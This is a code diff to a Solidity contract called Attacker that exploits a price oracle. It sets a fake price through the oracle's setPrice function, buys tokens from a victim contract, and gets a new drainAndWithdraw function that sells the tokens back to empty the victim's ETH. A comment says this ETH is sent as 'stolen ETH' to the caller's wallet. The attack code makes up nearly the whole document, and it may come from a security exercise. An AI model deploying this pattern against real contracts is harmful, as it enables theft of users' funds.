@@ -5,8 +5,11 @@ interface IOracle {
     function setPrice(uint256 _price) external;
 }
 
+// Updated Interface to include the new functions
 interface IVictim {
     function buyTokens() external payable;
+    function sellTokens(uint256 amount) external;
+    function balances(address account) external view returns (uint256);
 }
 
 contract Attacker {
@@ -18,20 +21,26 @@ contract Attacker {
         victim = IVictim(_victim);
     }
 
-    // Only manipulates the oracle price
     function manipulatePrice(uint256 newPrice) public {
         oracle.setPrice(newPrice);
     }
 
-    // Full attack: manipulate price + buy tokens
     function attack(uint256 fakePrice) public payable {
         require(msg.value > 0, "Need ETH for attack");
-
-        // Step 1: manipulate oracle
         oracle.setPrice(fakePrice);
-
-        // Step 2: exploit victim
         victim.buyTokens{value: msg.value}();
+    }
+
+    // --- NEW FUNCTION FOR CASH OUT ---
+    function drainAndWithdraw() public {
+        // 1. Check how many tokens this contract owns
+        uint256 myBalance = victim.balances(address(this));
+
+        // 2. Sell them back to the victim (Drains the ETH)
+        victim.sellTokens(myBalance);
+
+        // 3. Send the stolen ETH to YOUR wallet
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     // Needed so contract can receive ETH
